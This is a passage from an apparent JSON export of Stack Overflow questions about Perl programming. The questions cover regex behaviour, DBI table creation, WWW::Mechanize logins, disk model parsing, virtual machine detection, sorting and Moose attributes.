much!</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":285,"score":9,"question_id":12878832,"title":"Why is this regex not greedy?","body":"<p>In this regex</p>\n\n<pre><code>$line = 'this is a regular expression';\n$line =~  s/^(\\w+)\\b(.*)\\b(\\w+)$/$3 $2 $1/;\n\nprint $line;\n</code></pre>\n\n<p>Why is $2 equal to <code>\" is a regular \"</code>? My thought process is that (.*) should be greedy and match all characters until the end of the line and therefore $3 would be empty. </p>\n\n<p>That's not happening, though. The regex matcher is somehow stopping right before the last word boundary and populating $3 with what's after the last word boundary and the rest of the string is sent to $2. </p>\n\n<p>Any explanation?\nThanks. </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":99,"score":2,"question_id":12879858,"title":"Is there a man page for `perl` itself?","body":"<p>I wanted to find out what <code>perl -T</code> means.</p>\n\n<p><code>man perl</code> says:</p>\n\n<pre><code>PERL(1)                               Perl Programmers Reference Guide                               PERL(1)\n\nNAME\n       perl - The Perl 5 language interpreter\n\nSYNOPSIS\n       perl [ -sTtuUWX ]      [ -hv ] [ -V[:configvar] ]\n            [ -cw ] [ -d[t][:debugger] ] [ -D[number/list] ]\n            [ -pna ] [ -Fpattern ] [ -l[octal] ] [ -0[octal/hexadecimal] ]\n            [ -Idir ] [ -m[-]module ] [ -M[-]'module...' ] [ -f ]      [ -C [number/list] ]      [ -S ]\n            [ -x[dir] ]      [ -i[extension] ]\n            [ [-e|-E] 'command' ] [ -- ] [ programfile ] [ argument ]...\n</code></pre>\n\n<p>And then explains none of those command line arguments.</p>\n\n<p>Where can I find a manpage/perldoc for those command line arguments?</p>\n"},{"tags":["regex","string","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":103,"score":1,"question_id":10801294,"title":"Perl code for string replacement","body":"<p>I want to replace in a string the substrings \"[ids]\", \"[order]\", and \"[limit]\" with three other substrings (passed as parameters to my routine).</p>\n\n<p>But I want to cancel the special meaning of \"[...]\" if \"[\" or \"]\" is preceded by \"\\\" (\"\\[\", \"\\]\"). Also \"\\\" should cancel itself: \"\\\\\" means \"\\\".</p>\n\n<p>How to implement this in Perl?</p>\n\n<p>Note that we may use something other instead of \"[ids]\", \"[order]\", and \"[limit]\". This is not set in stone.</p>\n"},{"tags":["python","ruby","perl","bash","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12878594,"title":"Scripting language to find the .a file name from the concatenated nm output for a list of .a files","body":"<p>I have a file with the nm output for all the .a files in an application. Now, how do I find out the .a which contains a specified function. </p>\n\n<p>I am good with Bash scripting and am fairly competent in Perl and can do some Python and Ruby.</p>\n\n<p>Any suggestions on the scripting language I can use for doing this?</p>\n\n<p>Question update:\nI have a file which I created with the following command:</p>\n\n<pre><code>$ find . -name '*'.a &gt; afile_list.log\n$ while read line; do echo \"$line\"; nm $line; done &lt; ./afile_list.log &gt; a_list.log\n</code></pre>\n\n<p>Now I have a function fun1() in the codebase. How do I find out which of the .a's has this function in it?</p>\n"},{"tags":["php","perl","yii","catalyst"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":66,"score":0,"question_id":12878595,"title":"Choosing the Right Platform and Framework for a Food-based eCommerce Site","body":"<p>I'd like some opinions on the best platform and framework for a new project. </p>\n\n<p>I am responsible for managing the development of an eCommerce site for ordering food online. The desire is for a slick, intuitive consumer experience, with strong back office functions, including managing multiple suppliers, inventory, warehousing / picklists, invoicing and delivery, etc. </p>\n\n<p>After a fair amount of research, I have whittled my choices down to two, but am very open to suggestion. </p>\n\n<p>In both cases, I'll have a Linux/Apache/MySQL backend, and a strong jQuery/Ajax front end, and plan to utilize the MVC design model. </p>\n\n<p>In the middle, I'm trying to decide between:</p>\n\n<ol>\n<li>Perl, using the Catalyst framework, Template Toolkit for templating, and deployment through fastCGI. </li>\n<li>PHP, using the YII framework </li>\n</ol>\n\n<p>My knee-jerk reaction is PHP/YII, for development speed and simplicity. (Just trying to install Catalyst has been such a chore that I'm ready to bail.) </p>\n\n<p>(If you want to try and sell me on Java, or .asp/.NET, or Ruby or Python, that's fine, just make your case based on my needs.)</p>\n"},{"tags":["perl","login","www-mechanize"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":172,"score":0,"question_id":8556676,"title":"login with www::mechanize on a unnamed form with unnamed submit","body":"<p>i want to login ( stable ) with perl to a web site like <a href=\"http://site/signin/index.php\" rel=\"nofollow\">http://site/signin/index.php</a>.\nthis page have form and submit without name.\nhow can i login ?\nthis is a example code to login:</p>\n\n<pre><code>my $mech = WWW::Mechanize-&gt;new();\n$mech -&gt; cookie_jar(HTTP::Cookies-&gt;new());\n$mech -&gt; get($login_url);\n$mech -&gt; form_name('theform');\n$mech -&gt; field ('username' =&gt; $username);\n$mech -&gt; field ('password' =&gt; $password);\n$mech -&gt; click ('log in');\nprint $mech-&gt; content();\n</code></pre>\n\n<p>this is my form</p>\n\n<pre><code>&lt;form method=\"post\" action=\"\"&gt;\n&lt;table id=\"regform\" cellspacing=\"5\"&gt;\n&lt;tr&gt;\n&lt;td class=\"regparam\"&gt;email:&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"text\" name=\"email\" value=\"\" tabindex=\"1\" maxlength=\"100\" style=\"font-family: Tahoma; font-size: 10pt;  font-weight: bold; border: 1px solid #9AD7F8; background-color: #ffffff\" class=\"reginp\" /&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td class=\"regparam\"&gt;password:&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"password\" name=\"password\" value=\"\" tabindex=\"2\" maxlength=\"100\" style=\"font-family: Tahoma; font-size: 10pt;  font-weight: bold; border: 1px solid #9AD7F8; background-color: #ffffff\"  class=\"keyboardInput\" /&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;td valign=\"middle\"&gt;\n&lt;button type=\"submit\" style=\"font-weight:bold; tabindex=\"4\" class=\"subm-posts\"&gt;login&lt;/button&gt;\n&lt;label style=\"margin:0px; padding:0px; margin-left:10px; margin-top:7px; float:left; clear:none;\"&gt;\n&lt;input type=\"checkbox\" name=\"rememberme\" value=\"1\"  tabindex=\"3\" /&gt;\n&lt;span style=\"padding:2px; padding-left:5px;\"&gt;remember me&lt;/span&gt;\n&lt;/label&gt;\n&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n&lt;/form&gt;\n</code></pre>\n"},{"tags":["mysql","perl","ubuntu","syntax-error","create-table"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12877313,"title":"Trouble Creating Table with a variable using Perl in MySQL","body":"<p>I am trying to create a table in MySQL based on user input. Ideally, the Perl script would connect to the database and create a table with a variable that was received from the user. Here's my script:</p>\n\n<pre><code>print \"Please enter a name for the table: \";\n$tableName = &lt;&gt;;\nchomp($tableName);\n&amp;createTable ($tableName);\n\nsub createTable\n{\n    use DBI;\n    my $platform = \"mysql\";\n    my $database = \"example\";\n    my $host = \"localhost\";\n    my $user = \"user\";\n    my $pw = \"pw\";\n    my $dsn = \"dbi:$platform:$database:$host\";\n    my $dbh = DBI-&gt;connect($dsn, $user, $pw) or die \"Unable to connect: $DBI::errstr\\n\";\n    $dbh-&gt;do(\"DROP TABLE IF EXISTS $_\");\n    $dbh-&gt;do(\"CREATE TABLE $table (column VARCHAR(17))\");\n    $dbh-&gt;disconnect;\n}\n</code></pre>\n\n<p>But when I execute the script, and enter a value (let's say 'test'), it blurts this back to me:</p>\n\n<pre><code>DBD::mysql::db do failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1 at /path/to/scripts/dbTest.pl line 28, &lt;&gt; line 2.\nDBD::mysql::db do failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(column VARCHAR(17))' at line 1 at /path/to/scripts/dbTest.pl line 29, &lt;&gt; line 2.\n</code></pre>\n\n<p>Line 28 is the DROP command, and line 29 is the CREATE command.\nI've checked my syntax plenty of times, but I'm not seeming to get where the error is at. Am I overlooking something so simple..?</p>\n"},{"tags":["regex","linux","perl","ubuntu"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":86,"score":2,"question_id":12875541,"title":"Creating a Regex in Perl to extract a value","body":"<p>I'm having a bit of trouble pulling certain values from a variable in my Perl script on an Ubuntu 12.04 box.</p>\n\n<p>I looked over this page: <a href=\"http://stackoverflow.com/questions/5080988/how-to-extract-string-following-a-pattern-with-grep-regex-or-perl\">How to extract string following a pattern</a></p>\n\n<p>And this is sort of what I want to do. I need to extract a string value after a certain pattern.\nHere's the code I have thus far:</p>\n\n<pre><code>foreach $HDD (@sds)\n{\n    $hdStat = `hdparm -i $HDD | grep -Po 'Model=\\K.*?(?=,)'`;\n    $sdModel{$HDD} = $hdStat;\n    $hdStat = `hdparm -i $HDD | grep -Po 'SerialNo=\\K.*?(?=\")'`;\n    $sdSerial{$HDD} = $hdStat;\n}\nforeach $HDD (keys %sdModel)\n{\n    print $sdModel{$HDD};\n}\nforeach $HDD (keys, %sdSerial)\n{\n    print $sdSerial{$HDD};\n}\n</code></pre>\n\n<p>It will return the Model string just fine, but it won't return the SerialNo string. The code doesn't have to be with grep; I just modified the code from the link above. And seeing as how I am <em>terrible</em> with regex, I'm probably missing something basic here.</p>\n\n<p>Btw, the purpose of this code is to look through the /dev folder to find any disk drives, and if it does, sets it into an array, where the above script will then get it's Model # and Serial #.\nAlso, if anyone sees a better way to do what I'm doing, I am very open to suggestions. I am still very new to Perl (only been with it about a week so far).</p>\n"},{"tags":["linux","perl","virtualization","detection"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":106,"score":2,"question_id":12874288,"title":"How to detect if the script is running on a virtual machine?","body":"<p>I don't think the question needs any explanation.\nI'm writing a software that can boot virtual machines to simulate a network. I would like to disable this feature if the software is already running on a virtual machine.</p>\n\n<p>I already read this post: <a href=\"http://stackoverflow.com/questions/498371/how-to-detect-if-my-application-is-running-in-a-virtual-machine\">How to detect if my application is running in a virtual machine?</a>\nBut I need to do it on Linux and that post covers only Windows.</p>\n\n<p>I'm tagging it as a <code>Perl</code> question as I've to do it in Perl, but probably there are some file in <code>proc</code> or somewhere else to check and it's the same for all languages. I don't know actually.</p>\n\n<p>I'm interested in detecting mainly VirtualBox and KVM, as those are the VMs I'm using.</p>\n\n<p>So, any suggestion?</p>\n"},{"tags":["perl","matlab","sed","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":160,"score":6,"question_id":12872469,"title":"Get regions from a file that are part of regions in other file (Without loops)","body":"<p>I have two files: </p>\n\n<p>regions.txt: First column is the chromosome name, second and third are start and end position. </p>\n\n<pre><code>1  100  200\n1  400  600\n2  600  700\n</code></pre>\n\n<p>coverage.txt: First column is chromosome name, again second and third are start and end positions, and last column is the score.</p>\n\n<pre><code>1 100 101  5\n1 101 102  7 \n1 103 105  8\n2 600 601  10\n2 601 602  15\n</code></pre>\n\n<p>This file is very huge it is about 15GB with about 300 million lines.  </p>\n\n<p>I basically want to get the mean of all scores in coverage.txt that are in each region in regions.txt.</p>\n\n<p>In other words, start at the first line in regions.txt, if there is a line in coverage.txt which has the same chromosome, start-coverage is >= start-region, and end-coverage is &lt;= end-region, then save its score to a new array. After finish searching in all coverages.txt print the region chromosome, start, end, and the mean of all scores that have been found.  </p>\n\n<p>Expected output: </p>\n\n<pre><code>1  100 200 14.6   which is (5+7+8)/3\n1  400 600 0      no match at coverages.txt\n2  600 700 12.5   which is (10+15)/2\n</code></pre>\n\n<p>I built the following MATLAB script which take very long time since I have to loop over coverage.txt many time. I don't know how to make a fast awk similar script. </p>\n\n<p>My matlab script</p>\n\n<pre><code>fc = fopen('coverage.txt', 'r');\nft = fopen('regions.txt', 'r');\nfw = fopen('out.txt', 'w');\n\nwhile feof(ft) == 0\n\nlinet = fgetl(ft);\nscant = textscan(linet, '%d%d%d');\ntchr = scant{1};\ntx = scant{2};\nty = scant{3};\ncoverages = [];\n\n    frewind(fc);\n    while feof(fc) == 0\n\n    linec = fgetl(fc);\n    scanc = textscan(linec, '%d%d%d%d');\n    cchr = scanc{1};\n    cx = scanc{2};\n    cy = scanc{3};\n    cov = scanc{4};\n\n\n        if (cchr == tchr) &amp;&amp; (cx &gt;= tx) &amp;&amp; (cy &lt;= ty)\n\n            coverages = cat(2, coverages, cov);\n\n        end\n\n    end\n\n    covmed = median(coverages);\n    fprintf(fw, '%d\\t%d\\t%d\\t%d\\n', tchr, tx, ty, covmed);\n\nend    \n</code></pre>\n\n<p>Any suggestions to make an alternative using AWK, Perl, or , ... etc  I will aslo be pleased if someone can teach me how to get rid of all loops in my matlab script.</p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":123,"score":1,"question_id":12873937,"title":"Perl sub inside a sub","body":"<p>I want to have a sub inside another sub, </p>\n\n<pre><code>sub a {\n    sub b {\n    }\n}\n</code></pre>\n\n<p>I want to create a new instance of <code>sub b</code> for every call to <code>sub a</code>. Is there a way to do this in Perl?</p>\n\n<p>When I run the code above and print the address of <code>sub b</code> in <code>sub a</code> I always get the same address for <code>sub b</code> like</p>\n\n<pre><code>sub a {\n    print \\&amp;b;\n    sub b{\n    }\n}\n</code></pre>\n\n<p><a href=\"http://www.perlmonks.org/?node_id=801229\" rel=\"nofollow\">This link on Perl Monks</a> says that we can do this, but I always see the same address for <code>sub b</code>.</p>\n\n<p>Is there a way to create a new instance of <code>sub b</code> for every call to <code>sub a</code>?</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":68,"score":-5,"question_id":12873816,"title":"non programmer needs to know why proven perl script output file is missing.","body":"<p>Same script worked perfectly a few minutes ago???  Script scrapes website and saves results into a file named results.xls, but file is not in directory where it is supposed to be. have done windows 7 (pro) search, but no file is found?</p>\n"},{"tags":["c","perl","matlab","image-processing","imagemagick"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":108,"score":2,"question_id":12827526,"title":"How to find out straight lines in a image","body":"<p>I have an image file.(jpg or png)</p>\n\n<p>This is having only 4 colors and few black lines.(600px X 600px image size).\nThere can be 2 or 4 or 6 black lines.</p>\n\n<p>I need to get the (x1, y1) and (x2, y2) of each black lines.</p>\n\n<p>Can be implemented with perl or c or matlab</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12871808,"title":"Regex hangs for a pattern match","body":"<p>I've the input file <a href=\"https://docs.google.com/open?id=0B_NC5BaULb_6cDhwNEduaDRTTm8\" rel=\"nofollow\">here</a> (please extract it) and the code below. Just after print \"pat=\\n\"; it hangs in the pattern match while I see in Windows Task manager Perl(v5.010000) taking 25% CPU time:</p>\n\n<pre><code>use strict;\nopen FP, \"&lt;default.php\" or die \"can't read\";\n\n$/ = undef;    \n\nmy $content = &lt;FP&gt;;\n\nwhile ( $content =~ /(['\"])([^\\s\\x00-\\x1f]{300,})\\1/gs ) {\n#looks like we've found base encoded string etc\n    my $subpat = $2;\n    print \"pat=&lt;$subpat&gt;\\n\";\n    if ( $subpat =~ m#(?:(....).{5,30}(?=\\1)){50}#s ) {\n      print \"hello world\";\n    } else {\n      die(\"\");\n    }\n    exit;\n}\n</code></pre>\n\n<p>EDIT: Ideally what I want to figure out any uniform repeating pattern of bytes (length:4) in contiguous groups (max 50) in which each group size could be 4+30 bytes max and 4+5 bytes min.</p>\n\n<p>For example (repeating '=>' in each group of size 1 to 30 bytes):</p>\n\n<blockquote>\n  <p>'cs'=>'Czech','da'=>'Danish','nl'=>'Dutch','fi'=>'Finnish','fr'=>'French','de'=>'German','el'=>'Greek',</p>\n</blockquote>\n\n<p>The line : print \"pat=\\n\"; prints the following and hangs:</p>\n\n<blockquote>\n  <p>pat=&lt;,'hr'=>'Croatian','cs'=>'Czech','da'=>'Danish','nl'=>'Dutch','fi'=>'Finnish','fr'=>'French','de'=>'German','el'=>'Greek','hi'=>'Hindi','it'=>'Italian','ja'=>'Japanese','ko'=>'Korean','no'=>'Norwegian','pl'=>'Polish','pt'=>'Portuguese','ro'=>'Romanian','ru'=>'Russian','es'=>'Spanish','sv'=>'Swedish','ca'=>'Catalan','tl'=>'Filipino','iw'=>'Hebrew','id'=>'Indonesian','lv'=>'Latvian','lt'=>'Lithuanian','sr'=>'Serbian','sk'=>'Slovak','sl'=>'Slovenian','uk'=>'Ukrainian','vi'=>'Vietnamese','sq'=>'Albanian','et'=>'Estonian','gl'=>'Galician','hu'=>'Hungarian','mt'=>'Maltese','th'=>'Thai','tr'=>'Turkish','fa'=>'Persian','af'=>'Afrikaans','ms'=>'Malay','sw'=>'Swahili','ga'=>'Irish','cy'=>'Welsh','be'=>'Belarusian','is'=>'Icelandic','mk'=>'Macedonian','yi'=>'Yiddish','hy'=>'Armenian','az'=>'Azerbaijani','eu'=>'Basque','ka'=>'Georgian','ht'=>></p>\n</blockquote>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":750,"score":1,"question_id":3675052,"title":"Basename quirks - what are they","body":"<p>The documentation for File::Basename says</p>\n\n<pre><code>NOTE: \"dirname()\" and \"basename()\" emulate the behaviours, and quirks,\nof the shell and C functions of the same name. See each function's\ndocumentation for details. \n</code></pre>\n\n<p>What are these quirks?</p>\n"},{"tags":["perl","r","regression"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12864939,"title":"Extracting regression tree models built with R rpart","body":"<p>I've built several regression tree models using the rpart package in R and I need to migrate them into another language such as Perl.  </p>\n\n<p>The predict function works fine within R, but is there a way to print out something like the weighted formula at each node?</p>\n\n<p>Thank you,</p>\n\n<p>Rich</p>\n"},{"tags":["perl","unicode","decode"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12864752,"title":"Difference between Unicode and decoded strings","body":"<p>Are <code>decoded strings</code> without additional attributes and <code>Unicode</code> interchangeable?</p>\n\n<p>Update:</p>\n\n<p>Does it make a difference if I write</p>\n\n<pre><code>subroutine expects decoded strings.\n</code></pre>\n\n<p>or write</p>\n\n<pre><code>subroutine expects Unicode strings.\n</code></pre>\n\n<p>?</p>\n\n<pre><code>sub subroutine {\n    my $unicode = shift;\n    utf8::upgrade( $unicode );\n    my $gcs = Unicode::GCString-&gt;new( $unicode );\n    my $colwidth = $gcs-&gt;columns();\n    return $colwidth;\n}\n</code></pre>\n"},{"tags":["xml","perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":76,"score":-5,"question_id":12870587,"title":"Scandinavian and Chinese characters support in Perl and XML","body":"<p>Using a perl script, I am doing export of details (like username, last modified time etc.) and contents (general description) of many files in an XML file (output file). The perl script should support the export in many languages like Chinese, Finnish, Scandinavian characters, etc. </p>\n\n<p>I am not able to see Chinese characters in the vi editor in Unix. How should I provide this support in my Perl scripts. Please help!</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12870484,"title":"Perl WWW:Mechanize::Firefox disable alert","body":"<p>I am using Perl's <code>WWW::Mechanize::Firefox</code> to automate some website interaction. I am stuck at dealing with the alert popup. Until I click it I cannot go to the next stage. I am looking for a way to either disable it or Click <kbd>OK</kbd>.</p>\n\n<p>I have tried the following till now without any success:</p>\n\n<ul>\n<li><p><code>$mech-&gt;eval(\"alert = function(val){console.log(val+' (alert disabled)');};\");</code></p></li>\n<li><p><code>$mech-&gt;eval(\"window.alert = function(val){console.log(val+' (alert disabled)');};\");</code></p></li>\n<li><p><code>$mech-&gt;eval_in_page(\"alert = function(val){console.log(val+' (alert disabled)');};\");</code></p></li>\n<li><p><code>$mech-&gt;eval_in_page('alert(\"Hello\");', { alert =&gt; sub { print \"Captured alert: '@_'\\n\" } });</code></p></li>\n<li><p><code>$mech-&gt;eval_in_page('', { alert =&gt; sub { print \"Captured alert: '@_'\\n\" } });</code></p></li>\n</ul>\n\n<p>My test files are at:</p>\n\n<ul>\n<li><a href=\"https://github.com/jahagirdar/voter-reg/blob/master/bin/a.html\" rel=\"nofollow\">https://github.com/jahagirdar/voter-reg/blob/master/bin/a.html</a></li>\n<li><a href=\"https://github.com/jahagirdar/voter-reg/blob/master/bin/fill_form.pl\" rel=\"nofollow\">https://github.com/jahagirdar/voter-reg/blob/master/bin/fill_form.pl</a></li>\n</ul>\n\n<p>I am using Firefox version 15.0.1 \"Mozilla Firefox Ubuntu canonical version 1\".</p>\n\n<p>Installed addons are mozrepl 1.1 and Mozilla Ubuntu modifications 2.1.1.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":71,"score":3,"question_id":12867773,"title":"How can I do a match of the type \"if ($variable[any_index] =~ m/'string'/) {print $variable[next_index];}\"?","body":"<p>Please, how can I do a match like this:</p>\n\n<pre><code>my @variable = split;\nif ($variable[any_index] =~ m/'string'/) {print $variable[next_index];} \n</code></pre>\n\n<p>Is there a simple way to specify $variable[any_index]?</p>\n\n<p>Is it possible to use some kind of 'look ahead' in the statement 'print $variable[next_index]'?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["perl","selenium"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":52,"score":0,"question_id":12390582,"title":"Selenium::Remote::Driver or WWW::Selenium","body":"<p>Which one should I use for a new project?\nWhat is the difference between them?</p>\n"},{"tags":["perl","cpan","perl-module"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":72,"score":3,"question_id":11699118,"title":"Perl: CPAN - Module modifying and adding functionality","body":"<p>I find a module, that I want to change. </p>\n\n<p>My problem have some features like this: </p>\n\n<ul>\n<li>I want to <strong>add functionality and flexibility</strong> to this module.</li>\n<li>Now this module solves tasks, but web-service, for what it was written, change API </li>\n<li>And also, I want to use code of this module.</li>\n<li>It is <strong>not</strong> my module</li>\n<li>Fix some bugs </li>\n</ul>\n\n<p>How i should be in this situation?</p>\n\n<ul>\n<li>Inheriting from this module and add functionality and upload to CPAN?</li>\n<li>Ask author about my modifications (and reload module)?</li>\n<li>Something else? </li>\n</ul>\n"},{"tags":["perl","logging","parallel-processing"],"answer_count":2,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":112,"score":6,"question_id":11870205,"title":"Logging from output in Perl","body":"<p>I have a program that is supposed to run a set of other programs and collect their output for logging purposes. Everything is working fine as long as there is output to standard out.</p>\n\n<p>That leads me to my two problems:</p>\n\n<ol>\n<li><p>How can I capture both <code>STDIN</code> and <code>STDERR</code> of another program in one file?</p></li>\n<li><p>If there is no output at all (or output to <code>STDERR</code> only) the program will get stuck on the line:</p>\n\n<pre><code>while (&lt;$input&gt;)\n</code></pre></li>\n</ol>\n\n<p>How can I make the program wait for possible output from another program of indeterminate run time, and still continue if there is no output by the time the program finishes execution.</p>\n\n<p>Here is that section of the code</p>\n\n<pre><code>my $pid = open (my $input, '-|', \"$prog $args\")\n        or push @errors, \"A failute has occurred in $prog $args\";\nif(not @errors){\n    while (&lt;$input&gt;){ #POSSIBLE LOCATION FOR HANG UP IF NO PRINTING IS DONE\n        if($input =~ /^END\\n$/){\n            last;\n        }\n        print $fh $_;\n    }\n}\nelse{\n    print $fh \"An error has occurred with executing \\\"$prog $args\\\"\";\n}\n</code></pre>\n\n<p>note: <code>$fh</code> is my file handler used to write to my log file, and <code>@errors</code> is used for internally reporting errors in my program.</p>\n\n<p>EDIT:\nOne problem I experienced with trying the <a href=\"http://p3rl.org/Proc%3a%3aReliable\" rel=\"nofollow\">Proc::Reliable</a> route is that it seems to have after effects on <code>STDOUT</code> and <code>STDERR</code>, and I would need to fix those after each call to run. This leads to another problem in my code. I am running in parallel and any change to <code>STDOUT</code> and <code>STDERR</code> effect all of the threads <em>(using Windows at least)</em>.</p>\n\n<p><a href=\"http://p3rl.org/IO%3a%3aCaptureOutput\" rel=\"nofollow\">IO::CaptureOutput</a> has the same issue for me, but it tries to correct the <code>STDOUT</code> and <code>STDERR</code> jumbling internally and causes the following error to occur:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Couldn't remove temp file 'C:\\Users\\SBLAKE~1\\AppData\\Local\\Temp\\m8E3pUGfOS' - Permission denied at C:/Perl/site/lib/IO/CaptureOutput.pm line 82\n</code></pre>\n"},{"tags":["perl","user","portability","current"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":4455,"score":6,"question_id":3526420,"title":"How do I get the current user in Perl in a portable way?","body":"<p>How does one get the current user in a portable way?</p>\n\n<p>This seems like an FAQ but <a href=\"http://perldoc.perl.org/perlport.html\" rel=\"nofollow\">perlport</a> doesn't speak about it, maybe because some odd systems don't have the concept of \"user\" to being with? However, let's stick to *nix and Windows.</p>\n\n<p><code>getpwuid($&gt;)</code> is not implemented on Windows.</p>\n\n<p><code>$ENV{USER} || $ENV{USERNAME}</code> seems finicky.</p>\n\n<p><a href=\"http://search.cpan.org\" rel=\"nofollow\">http://search.cpan.org</a> didn't turn up much.</p>\n"},{"tags":["perl","scope","perl6"],"answer_count":7,"favorite_count":2,"up_vote_count":11,"down_vote_count":2,"view_count":581,"score":9,"question_id":7523757,"title":"Is it a design flaw that Perl subs aren't lexically scoped?","body":"<pre><code>{\n  sub a {\n    print 1;\n  }\n}\na;\n</code></pre>\n\n<p>A bug,is it?</p>\n\n<p><code>a</code> should not be available from outside.</p>\n\n<p>Does it work in Perl 6*?</p>\n\n<p>* Sorry I don't have installed it yet.</p>\n"},{"tags":["perl","sorting","arrays"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":139,"score":2,"question_id":12851242,"title":"Perl numerical sorting: how to ignore leading alpha character","body":"<p>I have a 1,660 row array like this:</p>\n\n<pre><code>...\nH00504\nH00085\nH00181\nH00500\nH00103\nH00007\nH00890\nH08793\nH94316\nH00217\n...\n</code></pre>\n\n<p>And the leading character never changes. It is always \"H\" then five digits. But when I do what I believe is a numerical sort in Perl, I'm getting strange results. Some segments are sorted in order, but then a different segment starts up. Here is a segment after sorting:</p>\n\n<pre><code>...\nH01578\nH01579\nH01580\nH01581\nH01582\nH01583\nH01584\nH00536\nH00537\nH00538\nH01585\nH01586\nH01587\nH01588\nH01589\nH01590\n...\n</code></pre>\n\n<p>What I'm trying is this:</p>\n\n<pre><code>my @sorted_array = sort {$a &lt;=&gt; $b} @raw_array;\n</code></pre>\n\n<p>But obviously it is not working. Anyone know why?</p>\n\n<p>I should add that, although these values all have \"H\" prepended, there remains the possibility that in the future we might end up with additional data prepended with some other letter. This means that removing the H, sorting, then replacing the H, is not a solution</p>\n"},{"tags":["regex","perl","filenames"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":82,"score":-4,"question_id":12861802,"title":"Regex: How to remove extra spaces between filename in Perl","body":"<p>How to remove extra spaces between filenames in Perl</p>\n\n<p>leading and trailing spaces can be removed by regex $line =~ s/^\\s+|\\s+$//x;</p>\n"},{"tags":["perl","moose","moo"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":115,"score":4,"question_id":12037066,"title":"How to declare 2 dependant attributes in Mooseish way?","body":"<p>In my object constructor i had statement to initialize two attributes same time:</p>\n\n<pre><code>($self-&gt;{token}, $self-&gt;{token_start}) = $self-&gt;_get_authorized_token();\n</code></pre>\n\n<p>So i got token and it's starting time together in one statement.</p>\n\n<p>Now i try to port my module to use Moo(se) and here i don't know how should i set those two bound attributes at same time?. Some pseudo code would be like that:</p>\n\n<pre><code>has qw/token token_start/ =&gt; (\n    is  =&gt; 'rw',\n    default =&gt; shift-&gt;_get_authorized_token(); \n);\n</code></pre>\n\n<p>But how to declare 2 bound attributes in Moo(se)ish way?</p>\n\n<hr>\n\n<p>EDIT. I show the code of the method <code>_get_authorized_token</code>, maybe it will brings some ideas:</p>\n\n<pre><code>sub _get_authorized_token {\n    my $self = shift;\n    my $postData = { 'apikey' =&gt; $self-&gt;{key} };\n    my $url = $self-&gt;{base_url} . '/seller';\n    my $xml = $self-&gt;_post(url =&gt; $url,\n                            postdata =&gt; $postData,\n                        );\n    my $ref = XMLin($xml, SuppressEmpty =&gt; '' );\n    my $time = $ref-&gt;{Notification_Datetime};\n    my $token = $ref-&gt;{Notification_Data}{body}{token};\n    return ($token, $time); \n}\n</code></pre>\n"},{"tags":["perl","cgi"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12864143,"title":"Strip Out The Last URL Name In String","body":"<p>I need to strip out the last page name in a variable.</p>\n\n<p>Here is my code so far but I loose the .jpg extension and I need to preserve it, Needed result: ImageName256.jpg</p>\n\n<pre><code>#!/usr/bin/perl\n\nprint \"Content-type: text/html\\n\\n\";\n\nuse CGI qw(:standard);\nuse CGI::Carp qw(warningsToBrowser fatalsToBrowser);\n\n\n$Variable = \"http://www.MyDomain.com/SomefolderPath/ImageName256.jpg\";\n\n($LastInUrl) = $Variable =~ m(.*/(\\w+));\n\nprint 